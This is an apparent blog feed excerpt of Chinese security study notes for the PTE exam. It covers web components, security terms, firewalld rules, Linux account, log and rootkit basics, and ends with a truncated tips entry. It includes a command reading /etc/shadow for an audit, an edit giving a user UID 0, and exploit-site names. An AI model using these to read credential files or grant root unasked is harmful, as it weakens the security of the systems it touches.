    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="web安全基础知识"><a href="#web安全基础知识" class="headerlink" title="web安全基础知识"></a>web安全基础知识</h1><h4 id="web组件"><a href="#web组件" class="headerlink" title="web组件"></a>web组件</h4><p>web服务器，又称为HTTP服务器，响应来自浏览器的HTTP请求，并且发送网页响应内容。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">IIS:微软提供的服务器软件，包括web、ftp、smtp等组件</span><br><span class="line">常见漏洞：IIS短文件名、IIS解析漏洞、IIS6.0远程代码执行</span><br><span class="line"></span><br><span class="line">Apache：开源网页服务器，世界使用排名第一的web服务器</span><br><span class="line">常见漏洞：apache解析漏洞、日志文件漏洞</span><br><span class="line"></span><br><span class="line">Nginx：高性能HTTP和反向代理服务器，也是IAMP&#x2F;POP3&#x2F;SMTP服务器</span><br><span class="line">常见漏洞：Nginx解析漏洞、整数溢出漏洞</span><br><span class="line"></span><br><span class="line">Tomcat：轻量级开源web应用服务器，开发和调试JSP程序首选</span><br><span class="line">常见漏洞：tomcat弱口令、tomcat远程代码执行、本地提权</span><br><span class="line"></span><br><span class="line">weblogic：基于JAVAEE架构的中间件，用于管理大型分布式web应用的java应用服务器</span><br><span class="line">常见漏洞：java反序列化、SSRF</span><br></pre></td></tr></table></figure><h4 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h4><p>数据库是按照数据结构来组织、存储和管理数据的仓库</p><p>结构化查询语言：简称SQL，用于存取数据以及查询、更新和管理关系数据库系统</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">数据库分类：Mysql、MSSQL、Access、Oracle、Sqlite</span><br><span class="line"></span><br><span class="line">数据库管理软件：Phpmyadmin、navicat</span><br></pre></td></tr></table></figure><h4 id="开发语言及常见框架cms"><a href="#开发语言及常见框架cms" class="headerlink" title="开发语言及常见框架cms"></a>开发语言及常见框架cms</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">开发框架:codelgniter、thinkPHP</span><br><span class="line">cms：phpcms、dedecms、qibocms</span><br><span class="line"></span><br><span class="line">ASP</span><br><span class="line">cms：aspcms、动易cms、南方数据</span><br><span class="line"></span><br><span class="line">.NET</span><br><span class="line">cms：siteserver</span><br><span class="line"></span><br><span class="line">JSP</span><br><span class="line">开发框架：struts2、Spring MVC</span><br><span class="line">cms：jeecms、大汉cms</span><br></pre></td></tr></table></figure><h4 id="web常见架构"><a href="#web常见架构" class="headerlink" title="web常见架构"></a>web常见架构</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">LAMP</span><br><span class="line">Linux+Apache+Mysql+PHP:适用于大型网站架构，稳定性高，如企业网站</span><br><span class="line"></span><br><span class="line">WAMP</span><br><span class="line">windows+Apache+Mysql+PHP：适用于中小型网站</span><br><span class="line"></span><br><span class="line">其他组合：</span><br><span class="line">PHP+IIS</span><br><span class="line">ASP+IIS</span><br><span class="line">.NET+IIS</span><br><span class="line">JSP+Tomcat</span><br></pre></td></tr></table></figure><h4 id="安全术语"><a href="#安全术语" class="headerlink" title="安全术语"></a>安全术语</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">后门：方便以后再次进入或控制系统</span><br><span class="line"></span><br><span class="line">webshell：以asp、php、jsp或cgi等网页文件形式存在的一种命令执行环境，是一种网页后门</span><br><span class="line"></span><br><span class="line">0day漏洞：官方还没有发现或者发现还没有开发出补丁的漏洞</span><br><span class="line"></span><br><span class="line">exploit：简称exp，漏洞利用</span><br><span class="line"></span><br><span class="line">提权：提升在服务器中的权限</span><br><span class="line"></span><br><span class="line">跳板：为了隐藏自己的地址，让别人无法查找到自己的位置</span><br><span class="line"></span><br><span class="line">拖库：网站被入侵后，窃取其数据库</span><br><span class="line"></span><br><span class="line">社会工程学：利用人性的弱点，达到自身的目的</span><br><span class="line"></span><br><span class="line">APT攻击：高级持续性威胁，利用先进的攻击手段对特定的目标进行长期持续性的网络攻击行为</span><br></pre></td></tr></table></figure><p>基于应用层的攻击手段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">弱口令攻击</span><br><span class="line">配置缺陷</span><br><span class="line">应用漏洞</span><br><span class="line">SQL&#x2F;XSS等</span><br><span class="line">....</span><br></pre></td></tr></table></figure><p>基于网络主机的攻击手段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DDOS攻击</span><br><span class="line">远程溢出攻击</span><br><span class="line">ARP欺骗攻击</span><br><span class="line">僵木蠕</span><br><span class="line">....</span><br></pre></td></tr></table></figure><p>攻击代码共享站点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rapid7.com</span><br><span class="line">packetstormsecurity.com</span><br><span class="line">exploit-db.com</span><br><span class="line">securityfocus.com</span><br><span class="line">securityvulns.com</span><br></pre></td></tr></table></figure><h2 id="Linux操作系统安全"><a href="#Linux操作系统安全" class="headerlink" title="Linux操作系统安全"></a>Linux操作系统安全</h2><h4 id="Linux系统概述"><a href="#Linux系统概述" class="headerlink" title="Linux系统概述"></a>Linux系统概述</h4><p>安全原则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">纵深防御</span><br><span class="line">运用PDCA模型</span><br><span class="line">最小权限法则</span><br><span class="line">白名单机制</span><br><span class="line">避免通过隐藏来实现安全</span><br><span class="line">入侵检测</span><br><span class="line">不要信任基础设施</span><br><span class="line">不要信任服务</span><br><span class="line">交付时保持默认安全</span><br></pre></td></tr></table></figure><p>组织和管理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">加强安全意识培训</span><br><span class="line">注意弱密码问题</span><br><span class="line">明令禁止使用破解软件</span><br><span class="line">组建合理的安全组织结构</span><br></pre></td></tr></table></figure><h4 id="Linux防火墙"><a href="#Linux防火墙" class="headerlink" title="Linux防火墙"></a>Linux防火墙</h4><h5 id="firewall"><a href="#firewall" class="headerlink" title="firewall"></a>firewall</h5><p>防火墙firewall支持ipv4与ipv6，并支持网桥，采用firewall-cmd或firewall-config(gui)来动态管理内核 netfilter的临时或永久的接口规则，并实时生效而无需重启服务。</p><p>zone</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">drop:丢弃所有包，不给回应</span><br><span class="line">block：拒绝所有外部发起的连接，允许内部的连接</span><br><span class="line">public：允许指定的进入连接</span><br><span class="line">dmz：允许受限制的进入连接</span><br><span class="line">work：允许受信任的计算机被限制的进入连接</span><br><span class="line">trusted：信任所有连接</span><br></pre></td></tr></table></figure><p>过滤规则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">source:根据源地址过滤</span><br><span class="line">interface：根据网卡过滤</span><br><span class="line">service：根据服务名过滤</span><br><span class="line">port：根据端口过滤</span><br><span class="line">icmp-block：icmp报文过滤</span><br><span class="line">masquerade：ip地址伪装</span><br><span class="line">forward-port：端口转发</span><br><span class="line">rule：自定义规则</span><br><span class="line"></span><br><span class="line">其中过滤规则优先级为：</span><br><span class="line">1.source</span><br><span class="line">2.interface</span><br><span class="line">3.firewalld.conf</span><br></pre></td></tr></table></figure><p>查看规则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">查看运行状态</span><br><span class="line">firewall-cmd --state</span><br><span class="line"></span><br><span class="line">查看被激活的zone信息</span><br><span class="line">firewall-cmd --get-active-zones</span><br><span class="line"></span><br><span class="line">查看指定接口的zone信息</span><br><span class="line">firewall-cmd --get-zone-of-interface&#x3D;ens32</span><br><span class="line"></span><br><span class="line">查看指定级别的接口</span><br><span class="line">firewall-cmd --zone&#x3D;public --list-interfaces</span><br><span class="line"></span><br><span class="line">查看指定级别的所有信息</span><br><span class="line">firewall-cmd --zone&#x3D;public --list-all</span><br><span class="line"></span><br><span class="line">查看所有级别被允许的信息</span><br><span class="line">firewall-cmd --get-service</span><br><span class="line"></span><br><span class="line">查看重启后所有被永久放行的服务</span><br><span class="line">firewall-cmd --get-service --permanent</span><br></pre></td></tr></table></figure><p>管理规则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">丢弃： firewall-cmd --panic-on</span><br><span class="line"></span><br><span class="line">取消丢弃: firewall-cmd --panic-off</span><br><span class="line"></span><br><span class="line">查看丢弃状态：firewall-cmd --query-panic</span><br><span class="line"></span><br><span class="line">更新规则，不重启服务：firewall-cmd --reload</span><br><span class="line"></span><br><span class="line">更新规则，重启服务：firewall-cmd --complete-reload</span><br><span class="line"></span><br><span class="line">添加某接口到某信任等级，永久修改</span><br><span class="line">firewall-cmd --zone&#x3D;public --add-interface&#x3D;eth0 --permanent</span><br><span class="line"></span><br><span class="line">设置public为默认的信任等级</span><br><span class="line">firewall-cmd --set-default-zone&#x3D;public</span><br></pre></td></tr></table></figure><p>管理端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">列出dmz级别的被允许的进入端口</span><br><span class="line">firewall-cmd --zone&#x3D;dmz --list-ports</span><br><span class="line"></span><br><span class="line">允许TCP8080端口至dmz级别</span><br><span class="line">firewall-cmd --zone&#x3D;dmz --add-port&#x3D;8080&#x2F;tcp</span><br></pre></td></tr></table></figure><h5 id="TCP-wrappers"><a href="#TCP-wrappers" class="headerlink" title="TCP wrappers"></a>TCP wrappers</h5><p>TCP wrappers是工作在传输层的安全工具，主要功能是控制谁能访问，常见程序有rpcbind、vsftpd、sshd、telnet等。</p><p>TCP wrappers的使用主要是依靠两个配置文件/etc/hosts.allow,/etc/hosts.deny，用于拒绝和接受具有TCPwrappers控制的程序。</p><p>工作原理</p><p><img src="/2020/07/27/PTE%E7%90%86%E8%AE%BA2/image-20200802145131891.png" alt="image-20200802145131891"></p><p>Denyhosts配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">secure_log&#x3D;&#x2F;var&#x2F;log&#x2F;secure   &#x2F;&#x2F;日志存放位置</span><br><span class="line">hosts_deny&#x3D;&#x2F;etc&#x2F;hosts.deny   &#x2F;&#x2F;检测到爆破后，指定在哪个配置文件中添加相应地址并禁止</span><br><span class="line">block_service &#x3D;sshd          &#x2F;&#x2F;指定封禁来源IP的哪些服务</span><br><span class="line">deny_threshold_invalid&#x3D;5     &#x2F;&#x2F;对于&#x2F;etc&#x2F;passwd下不存在的用户名暴力尝试，指定发现多少次封禁</span><br><span class="line">deny_threshold_root&#x3D;1        &#x2F;&#x2F;对root的暴力破解，指定发现多少次封禁</span><br><span class="line">hostname_lookup&#x3D;yes          &#x2F;&#x2F;是否启用来源IP到域名的解析</span><br></pre></td></tr></table></figure><h4 id="Linux用户安全"><a href="#Linux用户安全" class="headerlink" title="Linux用户安全"></a>Linux用户安全</h4><p>Linux用户管理涉及的文件：用户账号文件/etc/passwd、用户密码文件/etc/shadow、用户组文件/etc/group。</p><p>/etc/passwd格式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用户名：密码：用户ID、组ID、用户全称、主目录、登录shell</span><br></pre></td></tr></table></figure><p>/etc/shadow格式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用户名：密码：上次修改密码时间：两次修改密码间隔的最小天数：两次修改密码间隔的最大天数：提前几天警告用户密码过期：密码过期几天禁用用户：过期时间：保留字段</span><br></pre></td></tr></table></figure><p>/etc/group用户组文件</p><p>/etc/skel：在Linux系统新创建一个用户时，系统会自动把/etc/skel目录下的所有内容复制到新用户的主目录”/home/用户名下”</p><p>超级用户权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">进程控制</span><br><span class="line">设备控制</span><br><span class="line">网络控制</span><br><span class="line">文件系统控制</span><br><span class="line">用户控制</span><br></pre></td></tr></table></figure><p>用户管理基本操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">增加用户：useradd</span><br><span class="line">为用户设置密码：passwd</span><br><span class="line">删除用户：userdel</span><br><span class="line">修改用户属性：usermod</span><br></pre></td></tr></table></figure><h5 id="用户密码管理"><a href="#用户密码管理" class="headerlink" title="用户密码管理"></a>用户密码管理</h5><p>设置密码复杂度authconfig，配置文件/etc/security/pwquality.conf</p><p>生成复杂密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">keepass：图形界面</span><br><span class="line">openssl：openssl rand-base64 20</span><br><span class="line">pwgen：pwgen -c -n -y 12 1   </span><br><span class="line">-c至少一个大写字母</span><br><span class="line">-n至少一个数字</span><br><span class="line">-y至少一个特殊字符</span><br></pre></td></tr></table></figure><h5 id="账户安全"><a href="#账户安全" class="headerlink" title="账户安全"></a>账户安全</h5><p>使用下面的命令检查空口令账户是否存在：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk -F：&#39;($2&#x3D;&#x3D;&quot;!!&quot;)&#123;print $1&#125;&#39; &#x2F;etc&#x2F;shadow</span><br></pre></td></tr></table></figure><p>检测UID为0的用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk -F:&#39;($3&#x3D;&#x3D;&quot;0&quot;)&#123;print $1&#125;&#39; &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><h4 id="Linux文件系统"><a href="#Linux文件系统" class="headerlink" title="Linux文件系统"></a>Linux文件系统</h4><p>在Linux系统中，文件系统采用树状层次的目录结构，最顶层是根目录，用”/“表示，往下延申其各级子目录。</p><p><img src="/2020/07/27/PTE%E7%90%86%E8%AE%BA2/image-20200802160959356.png" alt="image-20200802160959356"></p><p>文件系统安全</p><p><img src="/2020/07/27/PTE%E7%90%86%E8%AE%BA2/image-20200802161106546.png" alt="image-20200802161106546"></p><p>Linux主要文件系统类型</p><p><img src="/2020/07/27/PTE%E7%90%86%E8%AE%BA2/image-20200802161203483.png" alt="image-20200802161203483"></p><h5 id="系统文件属性"><a href="#系统文件属性" class="headerlink" title="系统文件属性"></a>系统文件属性</h5><p><img src="/2020/07/27/PTE%E7%90%86%E8%AE%BA2/image-20200802162054144.png" alt="image-20200802162054144"></p><p>第一部分：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">由10个字符组成，第一个字符表示文件类型</span><br><span class="line">&quot;-&quot;表示普通文件</span><br><span class="line">d表示目录</span><br><span class="line">l表示链接文件</span><br><span class="line">s表示套接字文件</span><br><span class="line">p表示命名管道文件</span><br><span class="line">c表示字符设备文件</span><br><span class="line">b表示块设备文件</span><br></pre></td></tr></table></figure><p>第二部分：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">以冒号分隔，冒号前是文件的所有者，冒号后是文件所有者的用户组</span><br></pre></td></tr></table></figure><p>第三部分：表示文件的硬链接数</p><p>第四部分：以字节为单位的文件大小</p><p>第5，6，7部分表示文件最后的更新时间</p><p>第8部分：文件名</p><h5 id="文件类型"><a href="#文件类型" class="headerlink" title="文件类型"></a>文件类型</h5><p>Linux有4种基本系统文件类型：目录文件、普通文件、链接文件、特殊文件</p><p>通过ls -l命令可以返回文件的相关属性。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">普通文件：</span><br><span class="line">普通文件包括文本文件、程序代码文件、shell脚本、二进制可执行文件等</span><br><span class="line"></span><br><span class="line">目录文件：</span><br><span class="line">目录作为一个文件来对待，用d来表示，目录下可以包括文件和子目录</span><br><span class="line"></span><br><span class="line">链接文件：</span><br><span class="line">链接文件为一个指向文件的指针，通过链接文件，用户访问的将是指针指向的文件</span><br><span class="line"></span><br><span class="line">特殊文件：</span><br><span class="line">Linux中的特殊文件有三种。</span><br><span class="line">套接字文件socket：可以实现网络通信，标识值为s</span><br><span class="line">命名管道文件：可以实现进程间的通信，标识值为p</span><br><span class="line">设备文件：Linux为每个设备分配一个设备文件，存放在&#x2F;dev目录下，其中键盘属于字符设备，标识值为c</span><br><span class="line">内存、磁盘属于块设备文件，标识值为b</span><br></pre></td></tr></table></figure><p>文件和目录权限</p><p><img src="/2020/07/27/PTE%E7%90%86%E8%AE%BA2/image-20200802165836638.png" alt="image-20200802165836638"></p><h5 id="文件系统权限管理"><a href="#文件系统权限管理" class="headerlink" title="文件系统权限管理"></a>文件系统权限管理</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">更改文件和目录所有者：chown命令</span><br><span class="line">修改权限：chmod</span><br><span class="line">设置ACL：setfacl</span><br><span class="line">锁定文件：chattr</span><br><span class="line">设置默认权限：umask</span><br></pre></td></tr></table></figure><h4 id="Linux日志与审计"><a href="#Linux日志与审计" class="headerlink" title="Linux日志与审计"></a>Linux日志与审计</h4><h5 id="日志用途"><a href="#日志用途" class="headerlink" title="日志用途"></a>日志用途</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">系统审计：记录登录系统的用户和日常行为</span><br><span class="line">监测追踪：追踪溯源攻击者</span><br><span class="line">分析统计：系统性能、错误等统计</span><br></pre></td></tr></table></figure><p>Linux日志可以保存几乎所有的操作记录，Linux发行版默认的日志守护进程为rsyslog，位于/etc/rsyslog或/etc/rsyslogd，默认配置文件为/etc/rsyslog.conf。默认配置 下，日志文件都存放在”/var/log”目录下。</p><h5 id="Linux日志等级"><a href="#Linux日志等级" class="headerlink" title="Linux日志等级"></a>Linux日志等级</h5><p>Linux日志等级，priority表示产生日志的等级</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">debug:有调试信息，日志信息最多</span><br><span class="line">info：一般信息日志，最常用</span><br><span class="line">notice：最具重要性的普通条件的信息</span><br><span class="line">warning：警告级别</span><br><span class="line">err：错误级别，阻止某个功能或模块不能正常工作的信息</span><br><span class="line">crit：严重级别，阻止整个系统或软件不能正常工作的信息</span><br><span class="line">alert：需要理解修改的信息</span><br><span class="line">emerg：内核崩溃等严重信息</span><br><span class="line">none：什么都不记录</span><br><span class="line">从上到下，级别从低到高，记录的信息越来越少</span><br></pre></td></tr></table></figure><p>var/log下日志文件解释</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">系统引导日志：&#x2F;var&#x2F;log&#x2F;boot.log</span><br><span class="line"></span><br><span class="line">内核启动日志：&#x2F;var&#x2F;log&#x2F;dmesg</span><br><span class="line"></span><br><span class="line">系统日志：&#x2F;var&#x2F;log&#x2F;messages</span><br><span class="line"></span><br><span class="line">邮件系统日志：&#x2F;var&#x2F;log&#x2F;maillog</span><br><span class="line"></span><br><span class="line">FTP系统日志：&#x2F;var&#x2F;log&#x2F;xferlog</span><br><span class="line"></span><br><span class="line">安全信息：&#x2F;var&#x2F;log&#x2F;secure</span><br><span class="line"></span><br><span class="line">登录记录：&#x2F;var&#x2F;log&#x2F;wtmp</span><br><span class="line"></span><br><span class="line">RPM软件包：&#x2F;var&#x2F;log&#x2F;rpmpkgs</span><br><span class="line"></span><br><span class="line">cron计划任务日志：&#x2F;var&#x2F;log&#x2F;cron</span><br><span class="line"></span><br><span class="line">记录现在登录的用户：&#x2F;var&#x2F;run&#x2F;utmp</span><br><span class="line"></span><br><span class="line">记录所有用户登录和注销信息：&#x2F;var&#x2F;log&#x2F;wtmp</span><br><span class="line"></span><br><span class="line">记录最后登录信息：&#x2F;var&#x2F;log&#x2F;lastlog</span><br><span class="line"></span><br><span class="line">记录用户错误登录尝试：&#x2F;var&#x2F;log&#x2F;btmp</span><br></pre></td></tr></table></figure><h4 id="Rootkit与病毒木马检查"><a href="#Rootkit与病毒木马检查" class="headerlink" title="Rootkit与病毒木马检查"></a>Rootkit与病毒木马检查</h4><p>Rootkit是一种特殊的恶意软件。Rootkit主要功能：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">隐藏进程</span><br><span class="line">隐藏网络端口</span><br><span class="line">隐藏文件</span><br><span class="line">后门功能</span><br><span class="line">键盘记录器</span><br></pre></td></tr></table></figure><p>可以使用chkrootkit检查rootkit，官网为http:[]www.[]chkrootkit.org</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="PTE" scheme="http://yoursite.com/categories/PTE/"/>
    
    
      <category term="PTE" scheme="http://yoursite.com/tags/PTE/"/>
    
  </entry>
  
  <entry>
    <title>日常问题解决</title>
    <link href="http://yoursite.com/2020/07/16/%E6%97%A5%E5%B8%B8%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/"/>
    <id>http://yoursite.com/2020/07/16/日常问题解决/</id>
    <published>2020-07-16T08:12:25.000Z</published>
    <updated>2020-08-01T14:48:44.142Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="日常小知识"><a href="#日常小知识" class="headerlink" title="日常小知识"></a>日常小知识</h1><h2 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h2><h4 id="校验MD5"><a href="#校验MD5" class="headerlink" title="校验MD5"></a>校验MD5</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CertUtil -hashfile D:\XXX\XX\XXXXXXX.iso MD5</span><br></pre></td></tr></table></figure><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h4 id="kali设置中文"><a href="#kali设置中文" class="headerlink" title="kali设置中文"></a>kali设置中文</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt install locales</span><br><span class="line">apt install ttf-wqy-zenhei</span><br><span class="line">apt install xfonts-intl-chinese</span><br><span class="line">dpkg-reconfigure locales</span><br></pre></td></tr></table></figure><p>选中下面三个</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">en_US.UTF-8</span><br><span class="line">zh_CN.UTF-8</span><br><span class="line">zh_CN.GBK</span><br></pre></td></tr></table></figure><p>接着选择字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zh_CN.UTF-8</span><br></pre></td></tr></table></figure><p>然后reboot</p><h4 id="kali使用全局代理"><a href="#kali使用全局代理" class="headerlink" title="kali使用全局代理"></a>kali使用全局代理</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;proxychains.conf</span><br></pre></td></tr></table></figure><p><img src="/2020/07/16/%E6%97%A5%E5%B8%B8%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/image-20200727104600146.png" alt="image-20200727104600146"></p><p>在需要代理的命令前加上 proxychains</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains curl https:&#x2F;&#x2F;www.xx.xxx.xx</span><br></pre></td></tr></table></figure><h4 id="Ubuntu普通用户改root用户"><a href="#Ubuntu普通用户改root用户" class="headerlink" title="Ubuntu普通用户改root用户"></a>Ubuntu普通用户改root用户</h4><p>首先安装编辑器gedit</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gedit</span><br></pre></td></tr></table></figure><p>然后编辑/etc/passwd</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gedit &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p>将想要修改的用户的ID，一般为<code>1000:1000</code>,改为root用户ID<code>0:0</code></p><p>保存退出，重启即可。</p><h4 id="Ubuntu安装vmware-tool"><a href="#Ubuntu安装vmware-tool" class="headerlink" title="Ubuntu安装vmware tool"></a>Ubuntu安装vmware tool</h4><p>虚拟机点击安装vmware 